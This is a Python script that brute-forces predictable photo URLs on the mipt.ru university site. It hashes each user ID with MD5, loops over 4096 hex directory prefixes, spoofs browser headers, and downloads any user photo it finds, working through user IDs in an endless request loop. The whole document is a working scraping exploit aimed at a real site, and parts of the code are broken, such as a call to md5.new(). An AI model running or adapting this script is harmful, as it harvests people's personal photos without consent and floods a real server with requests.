#!/usr/bin/env python
# -*- coding: utf-8 -*-

import random
import string
import hashlib
import re
import requests
from urllib.parse import *
from hashlib import md5
import sys

import unicodedata
import time

host = u"mipt.ru"
dir = u'downloads/'
headers = {
    'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3',
    'Referer' : 'https://mipt.ru'
}

userid=int(str(sys.argv[1])) #22618
i=0
md5hash=md5()
strmd5hash=''

def nextUser():
    
    global i, userid, strmd5hash
    print(str(userid)+' id user photo not found')
    
    userid-=1;
    o=open(dir+'bruteforce'+'.log','a')
    o.write('start bruteforce '+ str(userid)+ ' id')
    o.close()
    i=0
    md5hash=md5.new()
    md5hash.update(str(userid).encode('utf-8'))
    strmd5hash=md5hash.hexdigest()
        
nextUser()  
        
        
def rnd():
    global i
    
    if i==4096:
	    nextUser()
    lst=format(i,'03x')
    ret = "".join(lst)
    i+=1
    return ret

def chk():
    #~ print(count)
    global strmd5hash, userid, i
    path = u'https://mipt.ru/upload/iblock/' + rnd() + u'/fu' + strmd5hash +'.jpg'
    req = requests.get(path, headers=headers)
    status = req.status_code
    content = req.content
    if 1==1:
            print(status)
            print(path)
            print(" fuck yeah")
    if status == 200:
         print(path)
         o=open(dir + str(userid) + '.jpg', 'wb')
         print(str(userid)+' user photo writing')
         o.write(content)
         o.close()
         i=4096
         o=open(dir+str(userid)+' .log','w')
         o.write('open ' + path)
         o.close()
    if status!=404 and status!=200:
        o=open(dir+str(userid)+' .log','w')
        o.write('fail to open ' + path)
        o.close()
        print('fail to open ' + path)
        i-=1
    return status


while 1:
    chk()
